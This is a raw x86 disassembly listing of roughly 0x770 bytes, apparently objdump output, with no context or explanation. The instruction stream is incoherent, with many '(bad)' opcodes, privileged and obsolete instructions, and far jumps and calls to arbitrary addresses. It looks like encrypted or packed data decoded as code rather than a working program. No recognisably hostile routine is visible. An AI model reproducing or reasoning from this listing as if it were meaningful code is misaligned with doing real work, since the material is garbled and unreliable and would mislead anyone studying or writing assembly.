  41c1ca:	fsubr  DWORD PTR [ebx]
  41c1cc:	lods   eax,DWORD PTR es:[esi]
  41c1ce:	sub    dh,cl
  41c1d0:	inc    eax
  41c1d1:	inc    ecx
  41c1d2:	loope  0x41c1e2
  41c1d4:	fwait
  41c1d5:	stos   DWORD PTR es:[edi],eax
  41c1d6:	sbb    ah,BYTE PTR [edi+0x57]
  41c1d9:	push   ss
  41c1da:	int3   
  41c1db:	sti    
  41c1dc:	icebp  
  41c1dd:	repnz and bl,BYTE PTR [ebx+eax*8]
  41c1e1:	jmp    0x66db:0xea1d0810
  41c1e8:	into   
  41c1e9:	xchg   esp,eax
  41c1ea:	mov    DWORD PTR [eax+0xf],esi
  41c1ed:	sbb    BYTE PTR [eax-0x34d5ae61],bl
  41c1f3:	dec    esi
  41c1f4:	push   0x353fe105
  41c1f9:	or     ch,BYTE PTR [ebp+0x19]
  41c1fc:	test   dh,dh
  41c1fe:	loopne 0x41c23c
  41c200:	mov    cl,0xba
  41c202:	and    ah,dh
  41c204:	xor    DWORD PTR [edx+0x5cee41c7],eax
  41c20a:	bound  ebx,QWORD PTR [edi-0xc]
  41c20d:	adc    cl,BYTE PTR [ebp*2-0x5b4e4cf4]
  41c214:	fnstsw WORD PTR ds:0x75d73e98
  41c21a:	or     eax,0x288e7b77
  41c21f:	inc    edx
  41c220:	jno    0x41c1b7
  41c222:	mov    bl,0x39
  41c224:	add    DWORD PTR ds:0x6e727e31,0xe
  41c22b:	fnsetpm(287 only) 
  41c22d:	mov    bh,0x5a
  41c22f:	je     0x41c260
  41c231:	xor    cl,BYTE PTR [eax+0x17]
  41c234:	adc    ecx,ecx
  41c236:	xor    al,0x10
  41c238:	jns    0x41c293
  41c23a:	xchg   ecx,eax
  41c23b:	jmp    0xb7ade3b4
  41c240:	into   
  41c241:	add    eax,0xc66e665f
  41c246:	js     0x41c282
  41c248:	push   DWORD PTR [edi]
  41c24a:	jnp    0x41c25c
  41c24c:	xor    al,0xbf
  41c24e:	jl     0x41c236
  41c250:	loop   0x41c1df
  41c252:	xchg   esi,eax
  41c253:	jbe    0x41c2cd
  41c255:	popf   
  41c256:	mov    dh,0xd1
  41c258:	rol    DWORD PTR [esi],0xb
  41c25b:	jg     0x41c23f
  41c25d:	jae    0x41c1ec
  41c25f:	int3   
  41c260:	arpl   WORD PTR [ecx],si
  41c262:	icebp  
  41c263:	cli    
  41c264:	aas    
  41c265:	leave  
  41c266:	pop    ebp
  41c267:	sub    bh,BYTE PTR [esi-0x1cedcfac]
  41c26d:	jbe    0x41c2ea
  41c26f:	out    dx,al
  41c270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c271:	add    bh,BYTE PTR [edi]
  41c273:	fldcw  WORD PTR [ebx+0x6af2715f]
  41c279:	pop    edi
  41c27a:	into   
  41c27b:	xor    BYTE PTR [edi-0x4e],ch
  41c27e:	inc    edi
  41c27f:	push   es
  41c280:	lock daa 
  41c282:	xor    eax,0x422726be
  41c287:	lahf   
  41c288:	cli    
  41c289:	mov    DWORD PTR [eax+0x2ea54a6a],ebp
  41c28f:	mov    edx,0x78958af
  41c294:	gs jae 0x41c309
  41c297:	loope  0x41c279
  41c299:	mov    eax,ds:0x6374dd9d
  41c29e:	in     eax,dx
  41c29f:	pusha  
  41c2a0:	out    dx,eax
  41c2a1:	xchg   edi,eax
  41c2a2:	fdivr  QWORD PTR [esi-0x129c2aca]
  41c2a8:	imul   esp,DWORD PTR [ecx+esi*2-0x7937234b],0xd9066d10
  41c2b3:	rcl    DWORD PTR [ebx+0x3b],0xde
  41c2b7:	ss in  al,dx
  41c2b9:	loope  0x41c259
  41c2bb:	jmp    0x22ed:0x4762c5d6
  41c2c2:	jmp    0xe70b:0x44621d58
  41c2c9:	add    edi,DWORD PTR [ebx+0x214b511a]
  41c2cf:	fidivr WORD PTR [ecx+0x2b]
  41c2d2:	sahf   
  41c2d3:	test   BYTE PTR [edx-0x319db235],ch
  41c2d9:	cmp    ah,BYTE PTR [eax-0x150a4214]
  41c2df:	pop    ebx
  41c2e0:	std    
  41c2e1:	adc    ebx,edi
  41c2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e4:	or     al,BYTE PTR [eax-0x35]
  41c2e7:	sbb    DWORD PTR [esi+0x42eeaa52],0xb3df4883
  41c2f1:	jne    0x41c349
  41c2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2f4:	sbb    BYTE PTR [ecx-0x58],bl
  41c2f7:	mov    eax,ds:0xfa89560
  41c2fc:	push   cs
  41c2fd:	fwait
  41c2fe:	sub    al,0x28
  41c300:	mov    al,0x4b
  41c302:	mov    esi,0x507ba42
  41c307:	pop    ds
  41c308:	test   eax,0x38841d1f
  41c30d:	xchg   esp,eax
  41c30e:	add    al,0x3c
  41c311:	sbb    DWORD PTR [edx+0x6bb75f3b],edx
  41c317:	inc    ecx
  41c318:	pushf  
  41c319:	ret    
  41c31a:	adc    eax,0x5a5c3845
  41c31f:	inc    edi
  41c320:	pop    ebp
  41c321:	dec    ebx
  41c322:	(bad)  
  41c323:	sbb    al,0x5d
  41c325:	nop
  41c326:	push   ss
  41c327:	nop
  41c328:	ja     0x41c392
  41c32a:	cdq    
  41c32b:	sub    DWORD PTR [edi+0x1f64cd72],ebp
  41c331:	nop
  41c332:	lea    edi,[ebx+0x699115d4]
  41c338:	cli    
  41c339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c33a:	or     BYTE PTR [ebx+0x2f],0x2e
  41c33e:	fsub   QWORD PTR [ebx+0x5947269b]
  41c344:	xchg   edx,eax
  41c345:	cmp    esp,edx
  41c347:	popf   
  41c348:	jae    0x41c33e
  41c34a:	mov    ecx,DWORD PTR [esp+esi*2]
  41c34d:	shl    DWORD PTR [edx+ebx*2+0x11],cl
  41c351:	aad    0x32
  41c353:	fadd   DWORD PTR [edx-0x72]
  41c356:	aam    0x1b
  41c358:	ret    0x1761
  41c35b:	lods   eax,DWORD PTR ds:[esi]
  41c35c:	mov    dl,0xf0
  41c35e:	and    ecx,DWORD PTR [edi]
  41c360:	lock sub edi,DWORD PTR [eax+eax*2]
  41c364:	adc    cl,BYTE PTR [esi+0x602da051]
  41c36a:	fld    TBYTE PTR [esi-0x80]
  41c36d:	imul   esi,esp,0xffffff86
  41c370:	jo     0x41c31b
  41c372:	adc    edi,DWORD PTR [eax]
  41c374:	pop    ss
  41c375:	dec    ecx
  41c376:	inc    edx
  41c377:	ds out dx,eax
  41c379:	fstp   TBYTE PTR [ebp+0x6984874]
  41c37f:	add    DWORD PTR [ecx],edi
  41c381:	std    
  41c382:	test   eax,0xfa02e697
  41c387:	retf   
  41c388:	sahf   
  41c389:	mov    ebx,0xfe62c259
  41c38e:	jge    0x41c3ad
  41c390:	sbb    DWORD PTR [ecx+0x42],esp
  41c393:	push   ecx
  41c394:	or     eax,0x642d0213
  41c399:	mov    al,0x70
  41c39b:	ss dec ebx
  41c39d:	stc    
  41c39e:	outs   dx,BYTE PTR ds:[esi]
  41c39f:	lods   eax,DWORD PTR ds:[esi]
  41c3a0:	loope  0x41c35d
  41c3a2:	sbb    ch,al
  41c3a4:	out    0x6e,eax
  41c3a6:	mov    al,BYTE PTR [ecx-0x36a827ba]
  41c3ac:	cmp    bl,BYTE PTR cs:[edi]
  41c3af:	loope  0x41c353
  41c3b1:	or     DWORD PTR [edi],0x97ea7e12
  41c3b7:	outs   dx,BYTE PTR ds:[esi]
  41c3b8:	iret   
  41c3b9:	or     eax,0x8ddb7e44
  41c3be:	loopne 0x41c416
  41c3c0:	popf   
  41c3c1:	aaa    
  41c3c2:	ja     0x41c358
  41c3c4:	ins    DWORD PTR es:[edi],dx
  41c3c5:	mov    DWORD PTR [ebx],ecx
  41c3c7:	dec    ebp
  41c3c8:	mov    ds:0x8b2d4710,al
  41c3cd:	daa    
  41c3ce:	or     dh,BYTE PTR [ebx]
  41c3d0:	retf   0x2b09
  41c3d3:	dec    ecx
  41c3d4:	cmp    DWORD PTR [edi+0x58a919c3],0x900404cf
  41c3de:	stos   BYTE PTR es:[edi],al
  41c3df:	aad    0x94
  41c3e1:	mov    dh,0x2b
  41c3e3:	push   ecx
  41c3e4:	(bad)  
  41c3e5:	repnz push esi
  41c3e7:	fisttp QWORD PTR [eax+0x681a7cd7]
  41c3ed:	js     0x41c388
  41c3ef:	push   ss
  41c3f0:	imul   ebx,DWORD PTR [eax+0x72f8857b],0xffffffbc
  41c3f7:	aam    0xa6
  41c3f9:	pop    ebp
  41c3fa:	fistp  WORD PTR [edx+0x383ad9d0]
  41c400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c401:	ret    0x39c9
  41c404:	out    dx,al
  41c405:	mov    gs:0xbddf1e46,al
  41c40b:	or     al,0xe3
  41c40d:	mov    edx,0xb033b669
  41c412:	adc    eax,0x5a6482dc
  41c417:	pop    edi
  41c418:	faddp  st(4),st
  41c41a:	sbb    al,0xca
  41c41c:	aas    
  41c41d:	adc    edi,DWORD PTR [edx-0xa6f6e11]
  41c423:	push   ebx
  41c424:	mov    ds:0x1dae975d,al
  41c429:	les    edx,FWORD PTR [esi]
  41c42b:	leave  
  41c42c:	je     0x41c3c3
  41c42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c42f:	arpl   WORD PTR [ebx-0x67],ax
  41c432:	mov    dl,0x1c
  41c434:	clc    
  41c435:	in     al,dx
  41c436:	adc    eax,0x3c074b6d
  41c43b:	jne    0x41c450
  41c43d:	inc    ebx
  41c43e:	bound  ebp,QWORD PTR [esi+0x10a88b78]
  41c444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c445:	inc    edi
  41c446:	jg     0x41c3e1
  41c448:	cmp    BYTE PTR [edx+0xab02cf7],0x4a
  41c44f:	jmp    esp
  41c451:	test   al,0x7
  41c453:	test   bh,bl
  41c455:	sbb    bl,BYTE PTR ds:0x62e21b2
  41c45b:	lods   eax,DWORD PTR ds:[esi]
  41c45c:	jle    0x41c4c6
  41c45e:	jl     0x41c3e7
  41c460:	fidivr DWORD PTR [ecx]
  41c462:	stc    
  41c463:	or     al,0x1e
  41c465:	dec    esi
  41c466:	xchg   DWORD PTR [ecx+0x6f338f03],ecx
  41c46c:	bnd ret 0x60b2
  41c470:	pop    ds
  41c471:	mov    WORD PTR es:[edi],es
  41c474:	fsub   QWORD PTR [edx-0x7c]
  41c477:	leave  
  41c478:	jmp    0x8c8a48b6
  41c47d:	xchg   ebp,eax
  41c47e:	gs ds push ebp
  41c481:	mov    BYTE PTR ds:0xba1eb9f1,0x63
  41c488:	test   DWORD PTR [ebx+0xf50719b],edi
  41c48e:	push   esi
  41c48f:	sub    DWORD PTR [edx],ecx
  41c491:	add    BYTE PTR [ecx+0x7d532c29],bh
  41c497:	mov    dl,0x81
  41c499:	cmp    eax,0x78e86ef8
  41c49e:	and    eax,0xd365673b
  41c4a3:	jmp    0x47110fa9
  41c4a8:	xchg   edx,eax
  41c4a9:	mov    dl,0x96
  41c4ab:	shl    BYTE PTR [ecx-0x57],cl
  41c4ae:	xor    DWORD PTR [ecx-0x5895c18c],esp
  41c4b4:	xchg   ebx,eax
  41c4b5:	(bad)  
  41c4b6:	pop    edx
  41c4b7:	jmp    0x43bf77ce
  41c4bc:	outs   dx,DWORD PTR ds:[esi]
  41c4bd:	push   edi
  41c4be:	and    esp,edi
  41c4c0:	sbb    BYTE PTR [ebx-0x6918b9db],ch
  41c4c6:	arpl   WORD PTR [ecx+eax*1+0x4a097365],dx
  41c4cd:	cmp    bl,BYTE PTR [ebp+0x70]
  41c4d0:	sbb    eax,0x2490cc49
  41c4d5:	into   
  41c4d6:	mov    bl,ah
  41c4d8:	xchg   DWORD PTR [edx+0x18c9f0bc],eax
  41c4de:	push   0xd577fad8
  41c4e3:	pop    esp
  41c4e4:	cmp    edx,eax
  41c4e6:	and    al,0xd4
  41c4e8:	es iret 
  41c4ea:	push   ebx
  41c4eb:	adc    al,0x37
  41c4ed:	xchg   ebp,eax
  41c4ee:	jns    0x41c4fb
  41c4f0:	inc    eax
  41c4f1:	push   0xffffffca
  41c4f3:	dec    esp
  41c4f4:	test   al,0x5a
  41c4f6:	cdq    
  41c4f7:	adc    DWORD PTR [esi-0x5134c7fe],esi
  41c4fd:	dec    esi
  41c4fe:	xor    al,0xc2
  41c500:	sub    cl,BYTE PTR [esi]
  41c502:	in     al,dx
  41c503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c504:	add    BYTE PTR [esi],bl
  41c506:	aam    0x2c
  41c508:	outs   dx,BYTE PTR ds:[esi]
  41c509:	and    al,0x26
  41c50b:	xor    eax,ecx
  41c50d:	xor    ebx,DWORD PTR [edi+0x72d47909]
  41c513:	into   
  41c514:	mov    dh,BYTE PTR [eax+0xd]
  41c517:	xchg   edi,eax
  41c518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c519:	rol    DWORD PTR [ecx-0x34ca4ac0],cl
  41c51f:	(bad)  
  41c520:	pop    ebp
  41c521:	sub    cl,cl
  41c523:	mov    edi,0x83457252
  41c528:	adc    ebx,DWORD PTR [ebx+eax*2-0x6]
  41c52c:	push   eax
  41c52d:	test   ecx,eax
  41c52f:	or     esp,ecx
  41c531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c532:	call   0x16588ef
  41c537:	pop    ebx
  41c538:	mov    DWORD PTR ds:0x270868fe,edi
  41c53e:	and    esp,DWORD PTR [ebx]
  41c540:	inc    ebx
  41c541:	and    DWORD PTR [edi+0x46],ecx
  41c544:	dec    esi
  41c545:	xor    eax,0x570a63c4
  41c54a:	je     0x41c4cc
  41c54c:	(bad)  
  41c54d:	cmp    al,0x59
  41c54f:	cs push edx
  41c551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c552:	cmp    esp,DWORD PTR [ebp-0x31ae5fa5]
  41c558:	cmp    BYTE PTR [edx-0x76783b3],0x45
  41c55f:	mov    eax,ds:0x848e6fcc
  41c564:	rcr    BYTE PTR [ecx+edi*4],1
  41c567:	xor    esi,0x46
  41c56a:	xchg   ebp,eax
  41c56b:	inc    BYTE PTR [edi+eiz*4-0x69]
  41c56f:	shl    ebx,1
  41c571:	lods   al,BYTE PTR ds:[esi]
  41c572:	daa    
  41c573:	fucomi st,st(5)
  41c575:	iret   
  41c576:	mov    WORD PTR ds:0x4d0f03e7,ds
  41c57c:	or     ebx,edx
  41c57e:	cmp    ch,BYTE PTR [ebp-0x735efcf9]
  41c584:	dec    esp
  41c585:	pop    ebx
  41c586:	add    BYTE PTR [esi+0x3],dh
  41c589:	leave  
  41c58a:	(bad)  
  41c58c:	data16 loopne 0x41c554
  41c58f:	add    ebp,DWORD PTR [esi+ebp*2+0x624ec9d6]
  41c596:	sar    DWORD PTR [ebx-0x11327c99],cl
  41c59c:	data16 jp 0x41c5a2
  41c59f:	and    BYTE PTR [eax],bl
  41c5a1:	push   ds
  41c5a2:	cdq    
  41c5a3:	or     ah,BYTE PTR [edx+0x27]
  41c5a6:	imul   ebx,DWORD PTR [edi+0x51],0xffffff88
  41c5aa:	xchg   ecx,eax
  41c5ab:	inc    edx
  41c5ac:	scas   al,BYTE PTR es:[edi]
  41c5ad:	pop    eax
  41c5ae:	push   ss
  41c5af:	mov    esp,0x3f8868b1
  41c5b4:	sbb    eax,0x66f2e41b
  41c5b9:	aas    
  41c5ba:	std    
  41c5bb:	fdecstp 
  41c5bd:	scas   eax,DWORD PTR es:[edi]
  41c5be:	mov    esi,0xb17603d6
  41c5c3:	dec    ecx
  41c5c4:	arpl   WORD PTR [edx+0x362d25b4],sp
  41c5ca:	jnp    0x41c575
  41c5cc:	aaa    
  41c5cd:	clc    
  41c5ce:	adc    ebx,esi
  41c5d0:	into   
  41c5d1:	scas   eax,DWORD PTR es:[edi]
  41c5d2:	nop
  41c5d3:	push   ecx
  41c5d4:	lds    ebx,FWORD PTR [edi-0x714b64d4]
  41c5da:	lea    ebx,[edx]
  41c5dc:	pop    edx
  41c5dd:	sti    
  41c5de:	out    0xef,al
  41c5e0:	and    eax,0xd3792a1a
  41c5e5:	lods   al,BYTE PTR ds:[esi]
  41c5e6:	arpl   WORD PTR [edi-0x59],si
  41c5e9:	or     edx,DWORD PTR [ecx-0x2ba4c48a]
  41c5ef:	sub    al,0x14
  41c5f1:	xor    eax,DWORD PTR [edx]
  41c5f3:	das    
  41c5f4:	test   BYTE PTR [ebp-0x40],al
  41c5f7:	fisttp QWORD PTR [edi+0x19]
  41c5fa:	rcl    DWORD PTR [ecx-0x440c95af],1
  41c600:	dec    edx
  41c601:	push   edi
  41c602:	adc    cl,BYTE PTR [edi-0x5a]
  41c605:	cmp    al,0xf
  41c607:	stos   BYTE PTR es:[edi],al
  41c608:	aaa    
  41c609:	pop    ds
  41c60a:	jmp    0x1e95f4f7
  41c60f:	iret   
  41c610:	scas   eax,DWORD PTR es:[edi]
  41c611:	mov    ecx,DWORD PTR [ebx]
  41c613:	xor    al,0x45
  41c615:	dec    esi
  41c616:	pop    ds
  41c617:	inc    esp
  41c618:	sub    al,0xf4
  41c61a:	xchg   edi,eax
  41c61b:	outs   dx,BYTE PTR ds:[esi]
  41c61c:	push   eax
  41c61d:	sbb    ebp,ebp
  41c61f:	jne    0x41c666
  41c621:	mov    ebx,0x42f2bfe9
  41c626:	mov    WORD PTR [esi],ss
  41c628:	stos   DWORD PTR es:[edi],eax
  41c629:	pop    ds
  41c62a:	xchg   ecx,eax
  41c62b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c62c:	jl     0x41c674
  41c62e:	cmp    al,0xca
  41c630:	adc    eax,0x5fb291bc
  41c635:	push   es
  41c636:	push   ds
  41c637:	cmp    eax,0xe660cda6
  41c63c:	js     0x41c65e
  41c63e:	int    0x7e
  41c640:	inc    ebp
  41c641:	mov    edx,0x57a96a4f
  41c646:	imul   eax,DWORD PTR [ecx-0x24],0xffffffed
  41c64a:	mov    dl,0xc6
  41c64c:	int    0x11
  41c64e:	mov    ebp,ebp
  41c650:	(bad)
  41c653:	arpl   WORD PTR [ecx+esi*4-0x32ddff50],si
  41c65a:	test   eax,0xea4c1726
  41c65f:	aas    
  41c660:	mov    ecx,DWORD PTR [ebx+0x37]
  41c663:	push   eax
  41c664:	sbb    al,0x1a
  41c666:	jnp    0x41c62a
  41c668:	sbb    DWORD PTR [eax],0x8824e6e7
  41c66e:	out    dx,eax
  41c66f:	std    
  41c670:	ins    BYTE PTR es:[edi],dx
  41c671:	push   eax
  41c672:	add    ecx,0x2f
  41c675:	iret   
  41c676:	fiadd  DWORD PTR [ebx+0x62]
  41c679:	add    eax,DWORD PTR [eax]
  41c67b:	push   edx
  41c67c:	sub    DWORD PTR [esi-0x14279d11],edx
  41c682:	xor    BYTE PTR ds:0x69237b7e,ch
  41c688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c689:	mov    edi,0xbf658c22
  41c68e:	jnp    0x41c6ad
  41c690:	dec    edi
  41c691:	mov    esp,0x72fa9e0d
  41c696:	rol    BYTE PTR [ebx],0x78
  41c699:	daa    
  41c69a:	loop   0x41c62c
  41c69c:	aas    
  41c69d:	repnz xor bh,ah
  41c6a0:	(bad)  
  41c6a1:	xor    al,0xea
  41c6a3:	xchg   ebx,eax
  41c6a4:	push   ebp
  41c6a5:	fadd   QWORD PTR [edi]
  41c6a7:	shl    BYTE PTR [edx-0x42b367d],0x48
  41c6ae:	mov    edx,0x4505c0bd
  41c6b3:	lea    edx,[eax+0x6ad97b10]
  41c6b9:	inc    ebx
  41c6ba:	js     0x41c71d
  41c6bc:	lock xor ebp,DWORD PTR [ecx]
  41c6bf:	ret    
  41c6c0:	sar    BYTE PTR ds:0x72670f2,0x9c
  41c6c7:	adc    al,0x8a
  41c6c9:	mov    esi,0xd163c2b8
  41c6ce:	mov    esi,0xb0f11bbe
  41c6d3:	jmp    0x41c6a1
  41c6d5:	xchg   ebp,eax
  41c6d6:	xor    ch,BYTE PTR [edi]
  41c6d8:	push   edx
  41c6d9:	aam    0x7a
  41c6db:	pop    ds
  41c6dc:	jmp    0x58d7:0xbeb66e75
  41c6e3:	or     DWORD PTR [ebp-0x1ebc4526],ebp
  41c6e9:	rcr    BYTE PTR [esi],0x5d
  41c6ec:	jmp    0x8a20:0xef190a51
  41c6f3:	sub    al,0xe6
  41c6f5:	cld    
  41c6f6:	daa    
  41c6f7:	cmp    DWORD PTR [edx],ebx
  41c6f9:	fisttp DWORD PTR [esp+eiz*4-0x571fc287]
  41c701:	mov    bl,dh
  41c703:	push   cs
  41c704:	gs dec edx
  41c706:	call   0x1e34:0x7365d504
  41c70d:	dec    esp
  41c70e:	dec    edi
  41c70f:	xchg   edi,eax
  41c710:	jecxz  0x41c769
  41c712:	cmp    BYTE PTR [esi+ecx*4],ah
  41c715:	ds stos BYTE PTR es:[edi],al
  41c717:	adc    eax,0x22533b3
  41c71c:	cli    
  41c71d:	sub    eax,edx
  41c71f:	mov    DWORD PTR [esi+0x56e40331],esp
  41c725:	rcr    dh,1
  41c727:	cli    
  41c728:	test   dl,cl
  41c72a:	or     BYTE PTR [edi+0x20],bh
  41c72d:	(bad)  
  41c72e:	mov    esp,0xcf3e2ae7
  41c733:	sbb    BYTE PTR [ebx+eax*1+0x2d],ah
  41c737:	in     eax,0x5b
  41c739:	lock out dx,al
  41c73b:	xor    eax,0xe03acf4d
  41c740:	xor    eax,DWORD PTR [ecx]
  41c742:	pop    ebp
  41c743:	xor    ah,0xb1
  41c746:	fisttp QWORD PTR [ecx+ebp*8-0x628d5ef5]
  41c74d:	or     BYTE PTR [edi-0x65],0x81
  41c751:	mov    edi,0xea28f455
  41c756:	or     BYTE PTR [ebp+0x5f6777be],cl
  41c75c:	xlat   BYTE PTR ds:[ebx]
  41c75d:	sbb    eax,0x378b8ec6
  41c762:	pop    esi
  41c763:	push   ss
  41c764:	xchg   edx,eax
  41c765:	add    al,ch
  41c767:	xlat   BYTE PTR ds:[ebx]
  41c768:	mov    ebp,0x57a37b0c
  41c76d:	(bad)  
  41c76e:	mov    dh,0x51
  41c770:	push   es
  41c771:	pop    ebp
  41c772:	or     ebp,ebx
  41c774:	int    0x9
  41c776:	xlat   BYTE PTR ds:[ebx]
  41c777:	(bad)  
  41c778:	jl     0x41c7e1
  41c77a:	aas    
  41c77b:	daa    
  41c77c:	bound  ebp,QWORD PTR [edi+0x3b0789d8]
  41c782:	loopne 0x41c77b
  41c784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c785:	cmp    al,BYTE PTR [eax-0x3da13e6a]
  41c78b:	test   BYTE PTR [esp+eax*4],ah
  41c78e:	loop   0x41c76c
  41c790:	pop    es
  41c791:	and    BYTE PTR ds:0xdc633f33,0xf2
  41c798:	inc    esp
  41c799:	xchg   BYTE PTR [ebx+0x2a178f8e],al
  41c79f:	jmp    0x41c803
  41c7a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7a2:	popa   
  41c7a3:	lock stos DWORD PTR es:[edi],eax
  41c7a5:	lods   al,BYTE PTR ds:[esi]
  41c7a6:	nop
  41c7a7:	dec    ebp
  41c7a8:	fisttp QWORD PTR [ebp-0x4f]
  41c7ab:	mov    al,0xa3
  41c7ad:	push   eax
  41c7ae:	fwait
  41c7af:	mov    ds:0xde7112da,eax
  41c7b4:	shr    esi,0xfa
  41c7b7:	sub    al,0x22
  41c7b9:	ins    BYTE PTR es:[edi],dx
  41c7ba:	int3   
  41c7bb:	xor    DWORD PTR [edi-0x4f],esi
  41c7be:	lods   eax,DWORD PTR gs:[esi]
  41c7c0:	cmp    ebp,edx
  41c7c2:	ins    DWORD PTR es:[edi],dx
  41c7c3:	cmp    BYTE PTR [ecx+0x5c],al
  41c7c6:	jmp    0x41c764
  41c7c8:	or     bl,al
  41c7ca:	sahf   
  41c7cb:	cmp    dh,al
  41c7cd:	pop    es
  41c7ce:	inc    ebp
  41c7cf:	mov    dl,0x83
  41c7d1:	aad    0xcf
  41c7d3:	mov    ds:0x9be5c62b,eax
  41c7d8:	es retf 0x318a
  41c7dc:	scas   al,BYTE PTR es:[edi]
  41c7dd:	fcomp  DWORD PTR [ebx+0x1ce0860e]
  41c7e3:	cli    
  41c7e4:	mov    eax,0x4fe0e3ae
  41c7e9:	imul   esp,DWORD PTR [edi+0x5f],0x3a
  41c7ed:	push   ebx
  41c7ee:	sbb    al,0x8d
  41c7f0:	jmp    0xc529c682
  41c7f5:	adc    BYTE PTR [eax+eiz*4+0x20],al
  41c7f9:	push   ebx
  41c7fa:	or     cl,BYTE PTR [edi+ebp*2]
  41c7fd:	dec    esi
  41c7fe:	pop    edx
  41c7ff:	lods   eax,DWORD PTR ds:[esi]
  41c800:	aad    0x52
  41c802:	xchg   DWORD PTR [edi],ebx
  41c804:	hlt    
  41c805:	add    al,0xd1
  41c807:	and    BYTE PTR cs:[eax],ch
  41c80a:	fimul  WORD PTR [eax+0x7149d327]
  41c810:	push   esi
  41c811:	(bad)  
  41c812:	fcomip st,st(2)
  41c814:	hlt    
  41c815:	sbb    ebx,DWORD PTR [edi-0x7b588181]
  41c81b:	(bad)  
  41c81c:	aam    0x47
  41c81e:	or     BYTE PTR [edx-0x276c1af5],bl
  41c824:	dec    ebx
  41c825:	jbe    0x41c7cc
  41c827:	sbb    DWORD PTR [edi-0x51],ecx
  41c82a:	dec    edx
  41c82b:	sub    edi,eax
  41c82d:	outs   dx,DWORD PTR ds:[esi]
  41c82e:	push   cs
  41c82f:	mov    ds:0x3d785e7c,eax
  41c834:	xlat   BYTE PTR ds:[ebx]
  41c835:	imul   eax,DWORD PTR [esi-0x4c25b38f],0xffffff8d
  41c83c:	push   ss
  41c83d:	lahf   
  41c83e:	mov    bl,BYTE PTR [ebx]
  41c840:	scas   eax,DWORD PTR es:[edi]
  41c841:	mov    ds:0xed69eb1d,al
  41c846:	jns    0x41c837
  41c848:	rcr    ecx,0x99
  41c84b:	add    al,0xb5
  41c84d:	push   0x4ff91c6e
  41c852:	imul   esp,DWORD PTR [esi+ebx*1-0xc59f1ed],0xffffff9e
  41c85a:	cmp    bh,ch
  41c85c:	mov    ah,0x67
  41c85e:	pop    edx
  41c85f:	and    esi,edx
  41c861:	or     al,0xaa
  41c863:	ja     0x41c840
  41c865:	sub    eax,0x105e931e
  41c86a:	dec    eax
  41c86b:	neg    DWORD PTR [ebp-0x6f]
  41c86e:	push   edx
  41c86f:	jbe    0x41c84a
  41c871:	add    eax,DWORD PTR [edx]
  41c873:	fcom   QWORD PTR [ebx]
  41c875:	aas    
  41c876:	(bad)  
  41c877:	push   ebp
  41c878:	mov    ebx,0xaf52c338
  41c87d:	test   DWORD PTR [edi],ebx
  41c87f:	mov    fs,WORD PTR [ebx+0x3b]
  41c882:	into   
  41c883:	jo     0x41c840
  41c885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c886:	xor    DWORD PTR [eax+ebx*2-0x360b3fbe],eax
  41c88d:	dec    edi
  41c88e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c88f:	pop    es
  41c890:	mov    edx,0xd6ea168
  41c895:	in     al,0xe5
  41c897:	loope  0x41c81a
  41c899:	sbb    DWORD PTR [ebx],0xd774d3b4
  41c89f:	(bad)  
  41c8a0:	pop    ebp
  41c8a1:	stos   BYTE PTR es:[edi],al
  41c8a2:	xchg   esi,eax
  41c8a3:	das    
  41c8a4:	ficom  DWORD PTR [edi-0x19171479]
  41c8aa:	xchg   ecx,eax
  41c8ab:	es and ah,dh
  41c8ae:	stc    
  41c8af:	sahf   
  41c8b0:	mov    cl,al
  41c8b2:	sti    
  41c8b3:	clc    
  41c8b4:	popa   
  41c8b5:	outs   dx,BYTE PTR ds:[esi]
  41c8b6:	out    dx,al
  41c8b7:	pop    ebp
  41c8b8:	or     esp,DWORD PTR [edi-0x55fd3925]
  41c8be:	or     eax,0xe1d93f6e
  41c8c3:	repz cmp dh,bl
  41c8c6:	hlt    
  41c8c7:	ja     0x41c8a5
  41c8c9:	dec    edi
  41c8ca:	lods   al,BYTE PTR ds:[esi]
  41c8cb:	jne    0x41c87c
  41c8cd:	je     0x41c87b
  41c8cf:	cmp    DWORD PTR [esi+0x5ff608ce],0x47
  41c8d6:	sbb    eax,0x632c5038
  41c8db:	jecxz  0x41c915
  41c8dd:	sbb    dl,BYTE PTR [edi-0x2]
  41c8e0:	jns    0x41c8aa
  41c8e2:	jae    0x41c91e
  41c8e4:	repnz mov bh,0x9f
  41c8e7:	mov    ecx,0x3b85850
  41c8ec:	sbb    eax,0xbb4cfa66
  41c8f1:	pop    ebp
  41c8f2:	adc    eax,0x8bd35d1e
  41c8f7:	dec    ebp
  41c8f8:	inc    esp
  41c8f9:	and    al,0x5b
  41c8fb:	mov    ch,bl
  41c8fd:	inc    eax
  41c8fe:	call   0x4d27e29b
  41c903:	inc    ebx
  41c904:	jmp    0x41c900
  41c906:	and    al,0x5d
  41c908:	sub    al,0x11
  41c90a:	es lahf 
  41c90c:	jle    0x41c92d
  41c90e:	sbb    ah,BYTE PTR [eax+0x219a626]
  41c914:	sub    DWORD PTR [edi-0x21537231],ebp
  41c91a:	sbb    DWORD PTR [esp+esi*2+0x255aedff],esi
  41c921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c922:	enter  0xce1e,0x1b
  41c926:	pop    eax
  41c927:	lea    esi,[ebp+0x78aeb3b0]
  41c92d:	je     0x41c94e
  41c92f:	pushf  
  41c930:	sub    dl,BYTE PTR [esi-0xb]
  41c933:	push   eax
  41c934:	mov    eax,0x69b45b77
  41c939:	dec    ebx
